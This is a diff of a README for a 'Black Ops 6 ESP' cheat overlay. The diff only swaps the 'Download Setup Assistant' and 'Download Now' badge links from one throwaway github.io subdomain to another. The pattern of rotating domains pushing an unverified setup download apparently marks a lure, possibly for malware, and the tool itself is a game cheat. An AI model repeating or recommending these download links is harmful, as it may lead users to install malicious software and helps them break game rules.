@@ -1,7 +1,7 @@
 # 🎯 Black Ops 6 ESP — Tactical Visual Overlay Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-red?style=for-the-badge)](https://blackops6toolcodwass0.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-black?style=for-the-badge&logo=call-of-duty)](https://blackops6toolcodwass0.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-red?style=for-the-badge)](https://black1ops6codesp1.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/Download_Now-black?style=for-the-badge&logo=call-of-duty)](https://black1ops6codesp1.github.io/.github/)
 
 ---
 
